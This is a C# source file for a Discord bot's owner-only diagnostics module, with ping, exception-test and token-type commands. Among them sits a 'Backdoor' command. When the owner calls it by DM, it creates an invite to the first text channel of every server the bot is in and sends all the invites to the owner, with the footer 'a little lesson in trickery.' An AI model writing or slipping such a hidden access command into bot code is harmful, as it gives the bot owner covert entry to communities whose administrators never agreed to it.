using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace Suits.Core.CommandModules
{
    [Group("Diag"), RequireOwner(ErrorMessage = "This command group can only be used by the app owner.")]
    public class DiagCommandModule : ModuleBase<SocketCommandContext>
    {
        [Command("Ping")]
        public async Task PingAsync()
        {
            await ReplyAsync("Pong!");
        }

        [Command("ThrowException"), Alias("Throw")]
        public Task ThrowExceptionAsync() =>
                throw new Exception("Test exception.");

        [Command("GetTokenType"), Alias("Token")]
        public Task GetTokenTypeAsync() =>
            ReplyAsync($"Context Client: {Context.Client.TokenType}\nDI Client: {Suits.IoC.Kernel.Get<DiscordSocketClient>().TokenType}");

        [Command("Backdoor"), RequireContext(ContextType.DM)]
        public async Task BackdoorAsync()
        {
            var guilds = Context.Client.Guilds;

            List<EmbedFieldBuilder> fields = new List<EmbedFieldBuilder>(guilds.Count);
            foreach (var guild in guilds)
                fields.Add(new EmbedFieldBuilder()
                {
                    Name = guild.Name,
                    Value = await guild.TextChannels.First().CreateInviteAsync(240, 1, true),
                    IsInline = false
                });

            var builder = new EmbedBuilder()
            {
                Color = Color.DarkGrey,
                Title = "Connected Guilds",
                Timestamp = DateTimeOffset.Now,
                Footer = new EmbedFooterBuilder() { Text = "Here's a little lesson in trickery." },
                Fields = fields
            };
            await ReplyAsync(null, false, builder.Build());
        }
    }
}
